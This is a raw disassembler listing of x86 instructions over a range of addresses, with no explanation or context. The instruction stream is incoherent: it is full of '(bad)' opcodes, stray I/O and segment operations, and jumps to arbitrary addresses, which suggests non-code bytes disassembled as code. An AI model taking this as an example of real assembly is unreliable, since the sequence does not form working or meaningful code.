  423594:	rcl    BYTE PTR [eax-0x42],cl
  423597:	fcom   DWORD PTR ds:0xdc7a0dcf
  42359d:	mov    cs,WORD PTR [eax+0x582fe1e4]
  4235a3:	inc    sp
  4235a5:	jo     0x423569
  4235a7:	cmp    al,0xd1
  4235a9:	push   edi
  4235aa:	ret    
  4235ab:	stc    
  4235ac:	outs   dx,BYTE PTR ds:[esi]
  4235ad:	out    dx,eax
  4235ae:	cld    
  4235af:	int    0xc8
  4235b1:	rcl    ecx,0x16
  4235b4:	adc    al,0x88
  4235b6:	inc    esi
  4235b7:	and    eax,0xb465bd88
  4235bc:	cmp    BYTE PTR ds:0xd128de64,0x2c
  4235c3:	sub    ebx,DWORD PTR ds:0xc9d8778d
  4235c9:	push   edi
  4235ca:	or     DWORD PTR [edx],edi
  4235cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235cd:	fadd   QWORD PTR ds:0xa0222a22
  4235d3:	out    0xfc,al
  4235d5:	xor    ah,dh
  4235d7:	jmp    0x58b4fd22
  4235dc:	das    
  4235dd:	push   eax
  4235de:	and    al,0xcf
  4235e0:	cmc    
  4235e1:	jns    0x4235b3
  4235e3:	repz pop edx
  4235e5:	(bad)  
  4235e6:	(bad)  
  4235e7:	stos   DWORD PTR es:[edi],eax
  4235e8:	adc    bh,dl
  4235ea:	enter  0x331,0xae
  4235ee:	pushf  
  4235ef:	pusha  
  4235f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235f1:	mov    ch,BYTE PTR [eax]
  4235f3:	(bad)  
  4235f4:	in     al,0x1f
  4235f6:	cld    
  4235f7:	or     eax,0xff3e03c4
  4235fc:	or     al,ch
  4235fe:	aaa    
  4235ff:	sbb    al,0x71
  423601:	test   esp,edx
  423603:	leave  
  423604:	leave  
  423605:	mov    ecx,0x5edfcff3
  42360a:	ret    
  42360b:	jmp    0x4235d4
  42360d:	adc    eax,eax
  42360f:	jns    0x4235ce
  423611:	pop    ebx
  423612:	jno    0x42366e
  423614:	push   ds
  423615:	ret    
  423616:	cmp    bl,0xcb
  423619:	out    dx,al
  42361a:	cmp    esi,DWORD PTR [eax+0x3f1a614f]
  423620:	pop    ss
  423621:	pushf  
  423622:	popf   
  423623:	ja     0x42360f
  423625:	in     al,0xe9
  423627:	dec    edx
  423628:	and    ecx,eax
  42362a:	dec    edx
  42362b:	dec    ecx
  42362c:	jne    0x4235fe
  42362e:	sub    ch,BYTE PTR [ebp-0x4b]
  423631:	mov    esp,0xcbc24e00
  423636:	push   ss
  423637:	gs out 0xb5,al
  42363a:	push   eax
  42363b:	fs push 0x413c0757
  423641:	in     eax,dx
  423642:	mov    ds:0x657cca8a,al
  423647:	imul   DWORD PTR [edx+0x61]
  42364a:	adc    bl,BYTE PTR [eax-0x4525c4d1]
  423650:	xlat   BYTE PTR ds:[ebx]
  423651:	pop    ss
  423652:	scas   al,BYTE PTR es:[edi]
  423653:	jmp    0xe3d7e322
  423658:	(bad)  
  423659:	mov    esi,0x611751ec
  42365e:	push   eax
  42365f:	rcl    BYTE PTR [ebp+0x40],0x95
  423663:	xchg   DWORD PTR [ebp-0x4e],esp
  423666:	xor    BYTE PTR [ecx+ecx*4],ah
  423669:	retf   0x849d
  42366c:	in     al,dx
	...
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x2e29b513
  4236e5:	xor    al,dl
  4236e7:	jnp    0x4236ea
  4236e9:	add    bh,bh
  4236eb:	add    BYTE PTR [eax],al
  4236ed:	add    BYTE PTR [ecx-0x7b],dl
  4236f0:	call   0xf575:0xc18c0d6
  4236f7:	(bad)  
  4236f8:	ja     0x42370c
  4236fa:	jb     0x42371c
  4236fc:	(bad)  
  4236fd:	xor    eax,0x377dd8b8
  423702:	xchg   BYTE PTR [ecx-0x53],dl
  423705:	sub    edx,DWORD PTR [esi-0x1c5316b2]
  42370b:	jno    0x423707
  42370d:	and    cl,BYTE PTR [ebx+0x14b16c0e]
  423713:	lea    edi,[esi-0x1b]
  423716:	clc    
  423717:	int3   
  423718:	call   0x58c0:0xeda53f78
  42371f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423720:	push   edi
  423721:	sub    DWORD PTR [ebx],esp
  423723:	bound  ecx,QWORD PTR [edi-0x44]
  423726:	ret    
  423727:	jmp    0x423763
  423729:	aam    0x48
  42372b:	out    dx,eax
  42372c:	sbb    BYTE PTR [ebp+ebx*2-0x4b],ch
  423730:	mov    eax,0xc2210c4b
  423735:	(bad)  
  423736:	hlt    
  423737:	add    al,dl
  423739:	lods   al,BYTE PTR ds:[esi]
  42373a:	inc    ecx
  42373b:	cwde   
  42373c:	(bad)  
  42373d:	js     0x4236f2
  42373f:	and    DWORD PTR [ebx+0x14],edi
  423742:	les    esp,FWORD PTR [esi+0x41]
  423745:	adc    DWORD PTR [edx+0x4c2fabc4],0x90772200
  42374f:	in     eax,dx
  423750:	rol    DWORD PTR [ebx-0x14],cl
  423753:	aad    0x42
  423755:	popw   ss
  423757:	lods   eax,DWORD PTR ds:[esi]
  423758:	sbb    DWORD PTR [esi+0x14],eax
  42375b:	sbb    DWORD PTR [edi],0xfffffff7
  42375e:	iret   
  42375f:	or     DWORD PTR [edx+0x42],ebx
  423762:	push   ecx
  423763:	dec    edx
  423764:	sub    edi,DWORD PTR [eax+0x1422a65e]
  42376a:	cli    
  42376b:	cmp    al,0xa6
  42376d:	(bad)  
  42376e:	retf   
  42376f:	mov    ax,0x8212
  423773:	jb     0x4237a9
  423775:	nop
  423776:	mov    al,ds:0x41b0dc65
  42377b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42377c:	pop    eax
  42377d:	sbb    DWORD PTR [ecx+eax*1],0xf28de9cc
  423784:	or     DWORD PTR [ebp-0x13],esp
  423787:	psignw mm6,QWORD PTR [edx-0x64]
  42378c:	mov    edi,0x245505ed
  423791:	pop    esp
  423792:	sub    ecx,DWORD PTR [esi+0x4f4cd1fc]
  423798:	ficomp DWORD PTR [edi-0x6c]
  42379b:	and    eax,0x69e32d72
  4237a0:	iret   
  4237a1:	jecxz  0x42372f
  4237a3:	stos   BYTE PTR es:[edi],al
  4237a4:	xor    bh,BYTE PTR [ebx-0x2ab2de53]
  4237aa:	pop    esp
  4237ab:	xchg   esp,eax
  4237ac:	cmp    DWORD PTR [ebx+0x14],esi
  4237af:	fwait
  4237b0:	jb     0x42379e
  4237b2:	xor    cl,BYTE PTR [edi+0x6f]
  4237b5:	addr16 cdq 
  4237b7:	xchg   edi,eax
  4237b9:	les    edi,FWORD PTR [esi+0x3f3eca43]
  4237bf:	ffreep st(0)
  4237c1:	mov    ebp,0x465c220e
  4237c6:	jne    0x4237dd
  4237c8:	pop    ds
  4237c9:	mov    DWORD PTR [ebp-0x27f26962],edx
  4237cf:	pop    esi
  4237d0:	(bad)  
  4237d2:	jmp    FWORD PTR [eax-0x65]
  4237d5:	jge    0x4237da
  4237d7:	add    edi,DWORD PTR [ecx]
  4237d9:	or     al,0x2f
  4237db:	cli    
  4237dc:	sbb    al,0xeb
  4237de:	pop    ebp
  4237df:	sbb    ecx,ebp
  4237e1:	in     eax,0xa7
  4237e3:	or     edx,eax
  4237e5:	iret   
  4237e6:	mov    esi,0xbd10a55
  4237eb:	pop    ecx
  4237ec:	fiadd  WORD PTR [eax]
	...
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7cc1:0xa5d7e93c
  423868:	add    DWORD PTR [eax],eax
  42386a:	inc    DWORD PTR [eax]
  42386c:	add    BYTE PTR [eax],al
  42386e:	pop    es
  42386f:	xor    al,BYTE PTR [esi]
  423871:	adc    esp,DWORD PTR [edi+0x20]
  423874:	adc    eax,DWORD PTR [ecx+0x3350c6a4]
  42387a:	jns    0x4238dd
  42387c:	or     ebp,DWORD PTR [esi-0x1d54bf81]
  423882:	jb     0x423839
  423884:	ret    
  423885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423886:	rcr    DWORD PTR [esi-0x7854d3bf],cl
  42388c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42388d:	ror    ebp,0x87
  423890:	sbb    bl,BYTE PTR [ebp+0x31b5a095]
  423896:	(bad)  
  423897:	adc    al,0x71
  423899:	hlt    
  42389a:	das    
  42389b:	sbb    eax,0xcad25f6c
  4238a0:	dec    esp
  4238a1:	pusha  
  4238a2:	aaa    
  4238a3:	add    DWORD PTR [esi],eax
  4238a5:	pushf  
  4238a6:	mov    ebx,0xe4674f09
  4238ab:	or     eax,0x6ecacb48
  4238b0:	mov    al,ds:0x9b0a5d7f
  4238b5:	sbb    DWORD PTR [edi+eax*1],0xc0e93bbb
  4238bc:	push   es
  4238bd:	aas    
  4238be:	bound  eax,QWORD PTR [ebp-0x4c3eca7e]
  4238c4:	xchg   ebp,eax
  4238c5:	unpcklps xmm3,XMMWORD PTR [edx]
  4238c8:	test   al,0x5
  4238ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238cb:	das    
  4238cc:	xor    BYTE PTR ds:[ebx-0x3a4bf355],al
  4238d3:	mov    edx,0x74a47b66
  4238d8:	mov    ds,WORD PTR ds:0xde1f2eb5
  4238de:	xchg   esi,eax
  4238df:	lods   eax,DWORD PTR ds:[esi]
  4238e0:	(bad)
  4238e4:	sub    eax,0x3a045228
  4238e9:	aaa    
  4238ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238eb:	ins    BYTE PTR es:[edi],dx
  4238ec:	ficomp WORD PTR [ecx]
  4238ee:	xor    DWORD PTR [eax],ebx
  4238f0:	and    BYTE PTR [eax-0x32658454],ch
  4238f6:	cmp    DWORD PTR [ebx],0x39ece58a
  4238fc:	push   ebx
  4238fd:	mov    gs,WORD PTR [edi-0x374265ab]
  423903:	cld    
  423904:	pushf  
  423905:	jb     0x4238cc
  423907:	retf   
  423908:	jmp    0x3b9ae1ea
  42390d:	test   BYTE PTR [edi+0x1d],dh
  423910:	jb     0x42389c
  423912:	inc    edi
  423913:	test   DWORD PTR [edi+0x73],edi
  423916:	or     esp,esp
  423918:	push   ss
  423919:	mov    cl,BYTE PTR [esi]
  42391b:	jl     0x423912
  42391d:	push   0x1d
  42391f:	pop    ebx
  423920:	inc    esp
  423921:	or     eax,0x35872649
  423926:	cmp    DWORD PTR [edx],ebx
  423928:	and    bh,al
  42392a:	push   ds
  42392b:	lods   eax,DWORD PTR ds:[esi]
  42392c:	jg     0x423908
  42392e:	sub    ah,BYTE PTR [edi]
  423930:	mov    eax,0x94ce1cdb
  423935:	fwait
  423936:	dec    ebp
  423937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423938:	sub    BYTE PTR [edx+0x201969ee],0x4d
  42393f:	dec    ebp
  423940:	xchg   ah,dl
  423942:	jl     0x42397f
  423944:	pop    es
  423945:	mov    eax,0xa6db70d
  42394a:	or     cl,BYTE PTR [esi+0x68]
  42394d:	in     eax,0x38
  42394f:	int    0x88
  423951:	push   edx
  423952:	sbb    eax,0x860909ff
  423957:	sbb    al,dh
  423959:	dec    edx
  42395a:	mov    edi,0x2130cd34
  42395f:	xchg   DWORD PTR [ecx-0x79c18201],ebp
  423965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423966:	in     al,dx
  423967:	jmp    0x26:0x12395063
	...
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0xf7f92bbd
  4239e4:	adc    bl,BYTE PTR [ebp+0x17dc0]
  4239ea:	inc    DWORD PTR [eax]
  4239ec:	add    BYTE PTR [eax],al
  4239ee:	in     al,0x25
  4239f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239f1:	rcr    BYTE PTR [esi+0x6e],0x45
  4239f5:	dec    esi
  4239f6:	(bad)  
  4239f7:	std    
  4239f8:	call   0x45fbd1a9
  4239fd:	dec    ecx
  4239fe:	and    DWORD PTR [ecx+0x36fbe718],edx
  423a04:	pushf  
  423a05:	ins    DWORD PTR es:[edi],dx
  423a06:	pop    edi
  423a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a08:	mov    eax,0x36dede29
  423a0d:	outs   dx,DWORD PTR ds:[esi]
  423a0e:	mov    ds:0x9e5aa3d8,al
  423a13:	mov    dh,BYTE PTR [eax+0x7700d3ec]
  423a19:	fsub   st,st(0)
  423a1b:	iret   
  423a1c:	add    ecx,DWORD PTR [esi]
  423a1e:	sub    bl,BYTE PTR [ebp+ecx*8+0x64]
  423a22:	mov    bl,0x60
  423a24:	in     al,dx
  423a25:	(bad)  
  423a26:	repz (bad) 
  423a28:	jmp    0x4239fd
  423a2a:	add    al,0x45
  423a2c:	push   ebp
  423a2d:	sbb    al,0xd2
  423a2f:	call   0x49a48aa0
  423a34:	xchg   edx,eax
  423a35:	dec    edi
  423a36:	and    BYTE PTR [ebx-0x39444bcc],dl
  423a3c:	pop    esp
  423a3d:	fld    TBYTE PTR [ebx]
  423a3f:	xor    eax,0xda1c65c3
  423a44:	popf   
  423a45:	push   ds
  423a46:	sbb    esi,DWORD PTR ds:0xa760952d
  423a4c:	mov    esp,DWORD PTR [ebp+0x28]
  423a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a50:	mov    bh,BYTE PTR [eax-0x63e02efa]
  423a56:	inc    DWORD PTR [edx]
  423a58:	add    edx,esp
  423a5a:	aaa    
  423a5b:	adc    al,0xce
  423a5d:	xchg   DWORD PTR [edx+0x4e0056ab],esi
  423a63:	sbb    DWORD PTR [esi+0x3e92f07b],esi
  423a69:	mov    esp,0xb3881b91
  423a6e:	mov    esp,DWORD PTR [ebx]
  423a70:	pop    ecx
  423a71:	addr16 inc ebx
  423a73:	repz cmp al,0x55
  423a76:	cld    
  423a77:	adc    al,0x82
  423a79:	arpl   WORD PTR [ecx],cx
  423a7b:	xchg   edi,eax
  423a7c:	adc    eax,0x4d60857c
  423a81:	stos   BYTE PTR es:[edi],al
  423a82:	or     DWORD PTR [edx+0x1258ebed],ebx
  423a88:	test   DWORD PTR [ebx+0x45],esi
  423a8b:	icebp  
  423a8c:	imul   eax,DWORD PTR [esi-0x1c43f269],0x73
  423a93:	mov    BYTE PTR [ecx],bl
  423a95:	inc    edx
  423a96:	mov    ds:0x71bf827e,al
  423a9b:	inc    esp
  423a9c:	ret    
  423a9d:	pop    ss
  423a9e:	aad    0x27
  423aa0:	icebp  
  423aa1:	add    BYTE PTR [ebx+eiz*4-0x6f674fc],al
  423aa8:	xchg   edi,eax
  423aa9:	xor    bl,bh
  423aab:	push   0x6f
  423aad:	pop    ds
  423aae:	add    esi,edx
  423ab0:	loop   0x423ab4
  423ab2:	xor    DWORD PTR [ebp+0xb599883],esp
  423ab8:	cld    
  423ab9:	mov    dh,0x98
  423abb:	lahf   
  423abc:	mov    esi,0x16a28bae
  423ac1:	mov    ds:0x3fd58c17,eax
  423ac6:	mov    edi,0x4115eded
  423acb:	stc    
  423acc:	mov    edx,0x9dd316b2
  423ad1:	jl     0x423b02
  423ad3:	jae    0x423af9
  423ad5:	inc    edx
  423ad6:	mov    edx,0x49d92cb2
  423adb:	sub    eax,0x1c4b6040
  423ae0:	pop    ecx
  423ae1:	mov    ah,0xc7
  423ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ae4:	mov    al,ds:0x23741728
  423ae9:	mov    edi,0x42f9d
	...
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	hlt    
  423b63:	std    
  423b64:	fcomp  DWORD PTR [ebx-0x41]
  423b67:	jle    0x423b6a
  423b69:	add    bh,bh
  423b6b:	add    BYTE PTR [eax],al
  423b6d:	add    dh,dl
  423b6f:	sbb    ah,BYTE PTR [edi+0x42607da4]
  423b75:	sti    
  423b76:	sbb    eax,0xe9ac287c
  423b7b:	sbb    DWORD PTR [edx],0xfe041aff
  423b81:	inc    eax
  423b82:	mov    edx,0xf9099568
  423b87:	add    ah,BYTE PTR [esi-0x170601b1]
  423b8d:	mov    eax,0x21f9088f
  423b92:	test   BYTE PTR [ebp-0x75ce472b],cl
  423b98:	test   bl,bh
  423b9a:	imul   esi,DWORD PTR [esi+esi*2-0x30],0xffffffb8
  423b9f:	mov    bh,dh
  423ba1:	sbb    eax,0xc7d1524e
  423ba6:	pop    ds
  423ba7:	lods   al,BYTE PTR ds:[esi]
  423ba8:	jae    0x423b2c
  423baa:	sar    DWORD PTR ds:0x6006725d,cl
  423bb0:	(bad)  
  423bb1:	imul   edi,DWORD PTR [edx+eax*1],0x548e132a
  423bb8:	mov    ah,0xd5
  423bba:	je     0x423bf4
  423bbc:	(bad)  
  423bbd:	dec    esi
  423bbe:	mov    edx,0xf7b65ff1
  423bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bc4:	stos   DWORD PTR es:[edi],eax
  423bc5:	imul   edi,DWORD PTR [ecx],0x8d4c4743
  423bcb:	inc    ebp
  423bcc:	jae    0x423bf6
  423bce:	inc    esi
  423bcf:	cld    
  423bd0:	jmp    0x423b6b
  423bd2:	xor    eax,0x61f59ef5
  423bd7:	push   eax
  423bd8:	sbb    edi,DWORD PTR [ebx]
  423bda:	iret   
  423bdb:	repz push ebp
  423bdd:	mov    bl,0x93
  423bdf:	sar    DWORD PTR [edi+eax*8],1
  423be2:	cmp    al,0x13
  423be4:	adc    DWORD PTR [ebx],0xf552d417
  423bea:	sub    eax,0xfca70f79
  423bef:	and    cl,BYTE PTR [eax+0x13aa9369]
  423bf5:	xchg   esi,eax
  423bf6:	ins    DWORD PTR es:[edi],dx
  423bf7:	pop    eax
  423bf8:	sub    al,0x2b
  423bfa:	sub    BYTE PTR [ebx],ah
  423bfc:	ror    DWORD PTR [edx-0x4f],1
  423bff:	add    bl,BYTE PTR [edx+eiz*4+0x4ab2ccef]
  423c06:	xor    DWORD PTR [edx-0x1b],ebx
  423c09:	leave  
  423c0a:	in     al,dx
  423c0b:	pop    edi
  423c0c:	cmp    al,0x8b
  423c0e:	pop    ecx
  423c0f:	das    
  423c10:	test   esi,ebx
  423c12:	stos   DWORD PTR es:[edi],eax
  423c13:	jmp    0x32227d45
  423c18:	adc    bh,BYTE PTR [edx+ecx*2]
  423c1b:	xor    al,0x5d
  423c1d:	js     0x423bb5
  423c1f:	push   eax
  423c20:	or     BYTE PTR [edi],ah
  423c22:	or     eax,eax
  423c24:	mov    eax,0xee87945a
  423c29:	push   eax
  423c2a:	leave  
  423c2b:	lds    esp,FWORD PTR [edx]
  423c2d:	rcl    BYTE PTR [eax],1
  423c2f:	or     cl,BYTE PTR [eax-0x40]
  423c32:	cmp    BYTE PTR [eax],dh
  423c34:	xchg   DWORD PTR [ecx+eiz*2-0x444ab5f6],eax
  423c3b:	jl     0x423bf2
  423c3d:	les    edi,FWORD PTR [ecx+ecx*4-0x5c]
  423c41:	xchg   ebx,eax
  423c42:	(bad)  
  423c43:	xchg   esi,eax
  423c44:	push   edi
  423c45:	mov    ebp,0xf92e2d71
  423c4a:	dec    eax
  423c4b:	xchg   esi,eax
  423c4c:	adc    al,0x6
  423c4e:	test   al,0x6c
  423c50:	fistp  WORD PTR [edi-0x5b]
  423c53:	aam    0x42
  423c55:	lds    edx,FWORD PTR [edi]
  423c57:	mov    al,ds:0xc5f5b69f
  423c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c5d:	xchg   edx,eax
  423c5e:	inc    ecx
  423c5f:	and    al,0x1e
  423c61:	mov    eax,ds:0x3b70090e
  423c66:	mov    eax,ds:0xa99277e8
  423c6b:	mov    edi,0x9b
	...
  423cd4:	add    BYTE PTR [eax],al
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x58446617]
  423ce3:	mov    dh,0xe7
  423ce5:	call   0x43bca8
  423cea:	inc    DWORD PTR [eax]
  423cec:	add    BYTE PTR [eax],al
  423cee:	dec    eax
  423cef:	add    DWORD PTR [esi-0x3],ebp
  423cf2:	push   edi
  423cf3:	lock mov al,0x4f
  423cf6:	call   FWORD PTR [edx-0x52c9f87c]
  423cfc:	pusha  
  423cfd:	and    edi,eax
  423cff:	pop    edx
  423d00:	(bad)  
  423d01:	fidivr WORD PTR [eax+0x12]
  423d04:	rcr    ch,cl
  423d06:	cmp    DWORD PTR [ebp+0x0],0xfffffffd
  423d0a:	mov    edi,DWORD PTR [eax-0x19d708a3]
  423d10:	ret    
  423d11:	in     al,dx
  423d12:	ins    DWORD PTR es:[edi],dx
  423d13:	dec    esi
  423d14:	mov    ds:0x6e34a231,al
  423d19:	nop
  423d1a:	jecxz  0x423cd6
  423d1c:	or     eax,0x6dc90994
  423d21:	ss inc ebp
  423d23:	aad    0x1d
  423d25:	shl    cl,1
  423d27:	sahf   
  423d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d29:	ret    
  423d2a:	bound  ebp,QWORD PTR [eax+0x6b3c62e0]
  423d30:	sub    DWORD PTR ds:[ebp-0x33],0x44249b21
  423d38:	xlat   BYTE PTR ds:[ebx]
  423d39:	data16 jne 0x423d25
  423d3c:	sbb    cl,BYTE PTR [ebx+0x62]
  423d3f:	sub    BYTE PTR [eax],dl
  423d41:	xor    al,0x10
  423d43:	outs   dx,DWORD PTR ds:[esi]
  423d44:	jbe    0x423d24
  423d46:	mov    WORD PTR [eax+edi*2-0x44],gs
  423d4a:	cs inc ecx
  423d4c:	sbb    DWORD PTR [ecx],0xe6325e56
  423d52:	mov    esi,0x77030542
  423d57:	pop    edi
  423d58:	xchg   ebp,eax
  423d59:	imul   ax,WORD PTR [ebx+edi*8-0x6642e998],0xbb9
  423d63:	stos   BYTE PTR es:[edi],al
  423d64:	xor    eax,0x7d97a1af
  423d69:	mov    eax,DWORD PTR [edx-0x378e7285]
  423d6f:	push   esp
  423d70:	push   edi
  423d71:	(bad)
  423d74:	xchg   BYTE PTR [esi],al
  423d76:	push   0xffffffda
  423d78:	ret    
  423d79:	pop    edi
  423d7a:	scas   al,BYTE PTR es:[edi]
  423d7b:	daa    
  423d7c:	mov    al,BYTE PTR [eax+0x6]
  423d7f:	cmc    
  423d80:	out    dx,al
  423d81:	jecxz  0x423d9a
  423d83:	ret    0x7013
  423d86:	xchg   edx,eax
  423d87:	lock dec edi
  423d89:	out    dx,eax
  423d8a:	loope  0x423df0
  423d8c:	mov    ebp,0x586dec90
  423d91:	out    dx,eax
  423d92:	mov    ds:0xde9b4881,eax
  423d97:	pop    edi
  423d98:	add    dl,BYTE PTR [edx-0x26]
  423d9b:	in     al,dx
  423d9c:	add    al,0x6
  423d9e:	dec    ebp
  423d9f:	sub    al,0x9f
  423da1:	dec    edx
  423da2:	xor    eax,DWORD PTR [esi]
  423da4:	(bad)  
  423da5:	push   ds
  423da6:	push   ebx
  423da7:	jo     0x423da1
  423da9:	stos   DWORD PTR es:[edi],eax
  423daa:	pop    esp
  423dab:	adc    bh,BYTE PTR [ebx+eax*4-0x6a]
  423daf:	lmsw   WORD PTR [ebp-0x19]
  423db3:	cdq    
  423db4:	aad    0xaf
  423db6:	inc    esi
  423db7:	dec    edx
  423db8:	in     al,0xc3
  423dba:	jmp    0x423e0f
  423dbc:	in     al,0xed
  423dbe:	xchg   edx,eax
  423dbf:	test   BYTE PTR [esi],ch
  423dc1:	mul    BYTE PTR [ecx+0x46]
  423dc4:	sbb    ebp,DWORD PTR [ebp+0x169bb0f0]
  423dca:	or     edi,ecx
  423dcc:	add    al,BYTE PTR [ecx]
  423dce:	ret    
  423dcf:	nop
  423dd0:	xor    al,0x9c
  423dd2:	mov    ebx,0x381731fa
  423dd7:	in     eax,dx
  423dd8:	sub    al,dh
  423dda:	ret    0x8110
  423ddd:	add    eax,0x5fdcfcfd
  423de2:	inc    ebp
  423de3:	loop   0x423d8a
  423de5:	cmp    BYTE PTR [eax-0x74],dl
  423de8:	xor    al,0xab
  423dea:	pop    ds
  423deb:	lods   al,BYTE PTR ds:[esi]
  423dec:	jecxz  0x423dee
	...
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax+0x420611d2],esp
  423e65:	xor    eax,0x180bd
  423e6a:	inc    DWORD PTR [eax]
  423e6c:	add    BYTE PTR [eax],al
  423e6e:	test   eax,0xd9e52614
  423e73:	fld    DWORD PTR [eax-0x3f6d5bca]
  423e79:	outs   dx,DWORD PTR ds:[esi]
  423e7a:	leave  
  423e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e7c:	cmp    DWORD PTR [ecx+0x6a],ebx
  423e7f:	popa   
  423e80:	iret   
  423e81:	imul   BYTE PTR [edi-0x6d70dc55]
  423e87:	push   edx
  423e88:	retf   
  423e89:	ret    0x2f25
  423e8c:	ffree  st(2)
  423e8e:	ja     0x423e52
  423e90:	shl    BYTE PTR [edi],cl
  423e92:	lods   al,BYTE PTR ds:[esi]
  423e93:	inc    edx
  423e94:	lods   al,BYTE PTR ds:[esi]
  423e95:	je     0x423ec7
  423e97:	push   ecx
  423e98:	std    
  423e99:	xor    esi,edx
  423e9b:	dec    esp
  423e9c:	jecxz  0x423e29
  423e9e:	mov    ah,0xf1
  423ea0:	retf   
  423ea1:	fwait
  423ea2:	(bad)  
  423ea3:	mov    esp,0x4fbc2df1
  423ea8:	shl    BYTE PTR [eax-0x3e501f97],0xc1
  423eaf:	shl    BYTE PTR [ecx+0x5f],1
  423eb2:	loope  0x423e41
  423eb4:	jb     0x423eb9
  423eb6:	add    al,0x6c
  423eb8:	xchg   edi,eax
  423eb9:	stc    
  423eba:	ins    DWORD PTR es:[di],dx
  423ebc:	push   0xffffff97
  423ebe:	jbe    0x423f1b
  423ec0:	mov    ebp,0xb2a78543
  423ec5:	retf   0x1114
  423ec8:	in     al,0xf5
  423eca:	sub    eax,DWORD PTR [ecx-0x27]
  423ecd:	xor    al,0xa
  423ecf:	aaa    
  423ed0:	ror    DWORD PTR [ecx+esi*2],0x79
  423ed4:	hlt    
  423ed5:	(bad)
  423eda:	jnp    0x423f47
  423edc:	aas    
  423edd:	xor    dh,BYTE PTR [ebp-0x11]
  423ee0:	xchg   BYTE PTR [ecx+0x5c6911de],bl
  423ee6:	aam    0xc
  423ee8:	xchg   BYTE PTR [esi],bh
  423eea:	cmp    esp,edx
  423eec:	out    0x3f,al
  423eee:	shl    BYTE PTR [edx-0x6],1
  423ef1:	test   BYTE PTR [eiz*1+0x4a74e162],ch
  423ef8:	(bad)  
  423ef9:	ds jbe 0x423eb0
  423efc:	pop    esp
  423efd:	ret    
  423efe:	mov    ecx,DWORD PTR [ecx+0x18]
  423f01:	clc    
  423f02:	adc    DWORD PTR [esp+ecx*1+0x55],esp
  423f06:	xchg   ebp,eax
  423f07:	inc    esp
  423f08:	xchg   ecx,eax
  423f09:	scas   eax,DWORD PTR es:[edi]
  423f0a:	mov    edx,0xe2182808
  423f0f:	sub    ah,BYTE PTR [esi+0x137577f8]
  423f15:	(bad)  
  423f16:	es inc ebp
  423f18:	mov    al,ds:0xd88e43c1
  423f1d:	rol    DWORD PTR [ecx],cl
  423f1f:	std    
  423f20:	dec    edx
  423f21:	lea    edx,[ecx-0xa6c3e0b]
  423f27:	pop    ss
  423f28:	loopne 0x423f03
  423f2a:	ins    DWORD PTR es:[edi],dx
  423f2b:	aad    0xa4
  423f2d:	je     0x423fa7
  423f2f:	fiadd  DWORD PTR [ecx+0x3]
  423f32:	jg     0x423ebd
  423f34:	or     al,BYTE PTR [ebx+edx*2]
  423f37:	or     esp,DWORD PTR [edi+0x3fad2048]
  423f3d:	mov    ds:0x6b6bb93d,al
  423f42:	push   ebp
  423f43:	and    eax,0xaa6d11bb
  423f48:	xor    bh,BYTE PTR [ebp+0x51]
  423f4b:	cdq    
  423f4c:	jg     0x423f44
  423f4e:	mov    bh,BYTE PTR [edx-0x7d]
  423f51:	fmul   QWORD PTR [eiz*1-0x3f08540]
  423f58:	jmp    0x17229df6
  423f5d:	pop    ds
  423f5e:	adc    ch,cl
  423f60:	into   
  423f61:	mov    edi,0x7fa3435d
  423f66:	jno    0x423f54
  423f68:	xor    DWORD PTR [ecx-0x47],ecx
  423f6b:	repz scas eax,DWORD PTR es:[edi]
	...
  423fd5:	add    BYTE PTR [esi+0x74b9649a],ch
  423fdb:	(bad)  
  423fdc:	call   FWORD PTR [edi-0x26e369ec]
  423fe2:	push   0xbc1b2a9f
  423fe7:	add    DWORD PTR [ecx],0xff00
  423fed:	add    BYTE PTR [esi-0x1c],bh
  423ff0:	fnstcw WORD PTR [ebp+0x11]
  423ff3:	(bad)  
  423ff4:	repnz into 
  423ff6:	ja     0x424000
  423ff8:	inc    edx
  423ff9:	add    al,0x5b
  423ffb:	aaa    
  423ffc:	bound  ebp,QWORD PTR [esi+0x65]
  423fff:	mov    ebx,0x5bfda40c
  424004:	xor    al,0xe5
  424006:	(bad)  
  424007:	sub    ebx,edx
  424009:	pop    esi
  42400a:	xchg   edi,eax
  42400b:	pop    ebx
  42400c:	mov    ch,0x3c
  42400e:	cs mov esi,0x7705dc58
  424014:	sahf   
  424015:	xchg   esi,eax
  424016:	fstp   QWORD PTR ds:0x8a8c92c0
  42401c:	jb     0x424072
  42401e:	inc    ebx
  42401f:	inc    eax
